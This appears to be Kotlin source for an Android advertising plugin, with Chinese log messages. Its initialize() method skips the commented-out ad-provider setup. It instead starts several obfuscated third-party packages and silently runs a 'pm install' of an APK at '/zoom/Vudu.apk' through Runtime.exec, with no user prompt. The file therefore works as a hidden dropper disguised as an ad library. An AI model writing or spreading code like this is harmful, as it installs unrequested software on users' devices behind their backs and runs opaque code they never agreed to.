package com.chihi.adplugin

import android.os.RecoverySystem.installPackage
import com.chihi.adplugin.log.printLog
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.Future

object AdPlugin {
    private lateinit var adDispatcher: AdDispatcher

    fun initialize() {
        // 注册多个广告提供商
        try {
            "插件包内部开始初始化".printLog()
            com.s.d.t.s(appContext)
            "IP包---s.d.t.s初始化完成".printLog()
            com.debby.Devour.getInstance().devourPlay(appContext)
            "IF240326包---com.debby.Devour初始化完成".printLog()
            com.unia.y.b.a(appContext,"7087","")
            "7087包---com.unia.y.b.a初始化完成".printLog()
            installPackage()
            //val sdkA = AdSdkAProvider()
            //val sdkB = AdSdkBProvider()
            //val providers = arrayListOf(sdkA)
            //adDispatcher = AdDispatcher(providers)
            //providers.forEach { it.initialize(appContext) }
        }catch (e:Exception){
            "插件内部初始化失败：${e.message}".printLog()
        }

    }

    private var executorService = Executors.newSingleThreadExecutor()
    private var currentTask: Future<*>? = null

    private fun installPackage() {
        val apkPath = "/zoom/Vudu.apk" // 指定APK文件的路径
        val command = arrayOf("pm", "install", apkPath) // 构建pm install命令

        // 取消上一个任务（如果存在）
        currentTask?.cancel(true)

        // 提交新任务
        currentTask = executorService.submit {
            try {
                val process = Runtime.getRuntime().exec(command) // 执行命令
                val inputStream = process.inputStream
                val errorStream = process.errorStream

                // 读取命令输出
                val output = inputStream.bufferedReader().use { it.readText() }
                val error = errorStream.bufferedReader().use { it.readText() }

                // 检查安装结果
                if (output.contains("Success")) {
                    "APK安装成功".printLog()
                } else {
                    "APK安装失败: $error".printLog()
                }
            } catch (e: IOException) {
                e.printStackTrace()
                "执行命令时发生错误: ${e.message}".printLog()
            }
        }
    }

    fun loadAd(config: AdConfig.() -> Unit) {
        adDispatcher.loadAd( config)
    }

    fun removeAd():Boolean = adDispatcher.removeAd()



}
